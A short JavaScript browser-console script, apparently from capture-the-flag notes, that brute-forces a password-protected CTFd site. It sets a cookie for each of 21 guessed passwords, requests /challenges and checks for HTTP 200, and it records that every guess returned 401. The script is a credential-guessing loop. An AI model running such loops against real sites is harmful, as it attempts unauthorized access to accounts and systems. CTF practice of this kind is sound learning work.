// ============================================================
// Script 02 — JavaScript Brute Force
// Target: https://skatt.ctfd.io
// Tool: Chrome DevTools Console
// Description: Iterates through password list, sets cookie,
//              fetches /challenges and checks for HTTP 200
// ============================================================

const passwords = [
    "skatt", "skattctf", "ctf", "welcome", "password",
    "admin", "skatt2024", "skatt2025", "skatt2026", "flag",
    "hacking", "norway", "skatt123", "ctf2025", "letmein",
    "secret", "skattectf", "SkattCTF", "SKATT", "skatt!",
    "ctf123"
];

async function tryPassword(pwd) {
    document.cookie = `site_password=${pwd}; path=/`;
    const res = await fetch("/challenges");
    return res.status === 200;
}

for (const pwd of passwords) {
    if (await tryPassword(pwd)) {
        console.log(" FOUND IT:", pwd);
        break;
    }
    console.log("X", pwd);
}

// ------------------------------------------------------------
// Results:
// All 21 passwords returned 401 Unauthorized
// No successful hits
// ------------------------------------------------------------
